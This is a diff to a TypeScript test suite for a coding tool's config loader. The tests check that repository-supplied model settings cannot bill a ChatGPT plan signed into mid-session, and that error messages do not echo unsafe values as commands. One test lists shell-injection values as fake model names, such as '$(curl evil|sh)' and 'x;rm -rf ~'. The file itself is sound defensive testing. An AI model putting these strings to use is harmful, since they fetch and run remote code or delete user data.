@@ -11,11 +11,13 @@ import {
   resolveCompactModelConfig,
   resolveEffortExplicit,
   resolveModelProviderConfig,
+  regateSessionConfig,
   resolveReducerModelConfig,
 } from './config.js';
 import { mkdtempSync, readFileSync, rmSync, mkdirSync, writeFileSync } from 'fs';
 import { join } from 'path';
 import { defaultConfig } from './test/fixtures.js';
+import { resolveSettingsWithProviderGate } from './settings-loader.js';
 import { collectWithheldProviderNotices } from './project-approval-notices.js';
 import { tmpdir } from 'os';
 import {
@@ -597,6 +599,118 @@ describe('loadConfig provider registry', () => {
     expect(resolveModelProviderConfig(withDefault, 'lab/model').apiKey).toBe('default-key');
   });
 
+  describe('a Sign in with ChatGPT provider saved mid-session (/login)', () => {
+    const planEntry = { type: 'chatgpt', models: { 'gpt-plan': {} } };
+    const signInRecord = (): void =>
+      writeFileSync(
+        join(isolatedHome, 'chatgpt-signin.json'),
+        JSON.stringify({
+          version: 1,
+          hostId: 'urn:uuid:test',
+          account: {
+            clientId: 'oaiapp_1',
+            subject: 's',
+            tokens: {
+              accessToken: 'plan-access-token',
+              idToken: 'id',
+              expiresAt: Date.now() + 3_600_000,
+              scopes: ['chatgpt.tokens.use.direct'],
+              savedAt: 0,
+            },
+          },
+        }),
+      );
+    /** What /login does: the user file gains the chatgpt provider; the session re-gates. */
+    const loginMidSession = (config: ReturnType<typeof loadConfig>) => {
+      writeFileSync(
+        join(isolatedHome, 'settings.json'),
+        JSON.stringify({
+          ...JSON.parse(readFileSync(join(isolatedHome, 'settings.json'), 'utf8')),
+          provider: { chatgpt: planEntry },
+        }),
+      );
+      signInRecord();
+      const reread = resolveSettingsWithProviderGate(workspace);
+      return regateSessionConfig(config, reread.settings, reread.providerGate);
+    };
+
+    it("never lets a workspace's compact, advisor or profile model bill a plan that appears after launch", () => {
+      process.env.BOOK_API_KEY = 'api-account-key';
+      delete process.env.BOOK_COMPACT_MODEL;
+      delete process.env.BOOK_ADVISOR_MODEL;
+      writeFileSync(join(isolatedHome, 'settings.json'), JSON.stringify({ model: 'gpt-4o' }));
+      writeFileSync(
+        join(workspace, '.book', 'settings.json'),
+        JSON.stringify({
+          compactModel: 'chatgpt/gpt-plan',
+          advisorModel: 'chatgpt/gpt-plan',
+          agents: { profiles: { explorer: { model: 'chatgpt/gpt-plan' } } },
+        }),
+      );
+      // At launch there is no chatgpt provider, so the launch gate has nothing to withhold.
+      const launched = loadConfig(workspace);
+      expect(launched.compactModel).toBe('chatgpt/gpt-plan');
+
+      const next = loginMidSession(launched);
+      expect(resolveCompactModelConfig(next).providerAuth).toBeUndefined();
+      expect(resolveAdvisorModelConfig(next)?.providerAuth).toBeUndefined();
+      expect(next.settings.agents.profiles.explorer?.model).toBeUndefined();
+      expect(next.workspaceProviderGate?.withheldSelections).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({ key: 'compactModel', reason: 'plan' }),
+          expect.objectContaining({ key: 'advisorModel', reason: 'plan' }),
+        ]),
+      );
+      // The user's own session model and key are untouched.
+      expect(next.modelSelection).toBe('gpt-4o');
+      expect(next.apiKey).toBe('api-account-key');
+    });
+
+    it('moves the session off a model a repository chose that now names the plan', () => {
+      process.env.BOOK_API_KEY = 'api-account-key';
+      writeFileSync(join(isolatedHome, 'settings.json'), JSON.stringify({}));
+      writeFileSync(
+        join(workspace, '.book', 'settings.json'),
+        JSON.stringify({ model: 'chatgpt/gpt-plan' }),
+      );
+      const launched = loadConfig(workspace);
+      expect(launched.modelSelection).toBe('chatgpt/gpt-plan');
+      const next = loginMidSession(launched);
+      expect(next.providerAuth).toBeUndefined();
+      expect(next.modelSelection).toBe('gpt-4o');
+    });
+
+    it('does the same for a legacy .bookrc.json model', () => {
+      process.env.BOOK_API_KEY = 'api-account-key';
+      writeFileSync(join(isolatedHome, 'settings.json'), JSON.stringify({}));
+      writeFileSync(join(workspace, '.bookrc.json'), JSON.stringify({ model: 'chatgpt/gpt-plan' }));
+      const launched = loadConfig(workspace);
+      expect(launched.modelSelection).toBe('chatgpt/gpt-plan');
+      const next = loginMidSession(launched);
+      expect(next.providerAuth).toBeUndefined();
+      expect(next.modelSelection).toBe('gpt-4o');
+      expect(next.workspaceProviderGate?.withheldSelections).toEqual([
+        expect.objectContaining({
+          key: 'model',
+          reason: 'plan',
+          path: join(workspace, '.bookrc.json'),
+        }),
+      ]);
+    });
+
+    it("keeps the user's own plan selections", () => {
+      process.env.BOOK_API_KEY = 'api-account-key';
+      writeFileSync(
+        join(isolatedHome, 'settings.json'),
+        JSON.stringify({ model: 'gpt-4o', advisorModel: 'chatgpt/gpt-plan' }),
+      );
+      const launched = loadConfig(workspace);
+      const next = loginMidSession(launched);
+      expect(resolveAdvisorModelConfig(next)?.providerAuth).toBe('chatgpt');
+      expect(next.workspaceProviderGate?.withheldSelections).toEqual([]);
+    });
+  });
+
   describe('a Sign in with ChatGPT provider (type "chatgpt")', () => {
     const settings = {
       model: 'plan/gpt-plan',
@@ -716,8 +830,36 @@ describe('loadConfig provider registry', () => {
       writeFileSync(join(workspace, '.bookrc.json'), JSON.stringify({ model: 'plan/gpt-plan' }));
       signIn();
       expect(() => loadConfig(workspace)).toThrow(
-        /BOOK_API_KEY or provider\.<id>\.apiKey not set[\s\S]*"plan\/gpt-plan" from .*\.bookrc\.json ignored: "plan" bills your ChatGPT plan[\s\S]*--model plan\/gpt-plan/,
+        /BOOK_API_KEY or provider\.<id>\.apiKey not set[\s\S]*"plan\/gpt-plan" from .*\.bookrc\.json ignored: "plan" bills your ChatGPT plan[\s\S]*`--model plan\/gpt-plan`/,
       );
+    });
+
+    it('suggests a --model command only for a plain id, never a repository-written string', () => {
+      delete process.env.BOOK_API_KEY;
+      writeFileSync(
+        join(isolatedHome, 'settings.json'),
+        JSON.stringify({ provider: settings.provider }),
+      );
+      signIn();
+      for (const value of [
+        'plan/gpt-plan $(curl evil|sh)',
+        "plan/a'b",
+        'plan/x;rm -rf ~',
+        'plan/`id`',
+      ]) {
+        writeFileSync(join(workspace, '.bookrc.json'), JSON.stringify({ model: value }));
+        let message = '';
+        try {
+          loadConfig(workspace);
+        } catch (error) {
+          message = (error as Error).message;
+        }
+        expect(message).toMatch(/set "model" in ~\/\.book\/settings\.json/);
+        // No command is suggested (the notice's own words may still name the --model flag).
+        expect(message).not.toMatch(/`--model /);
+      }
+      writeFileSync(join(workspace, '.bookrc.json'), JSON.stringify({ model: 'plan/gpt-5.5' }));
+      expect(() => loadConfig(workspace)).toThrow(/`--model plan\/gpt-5\.5`/);
     });
 
     it('ignores a plan model a repository ships in a legacy .bookrc.json', () => {
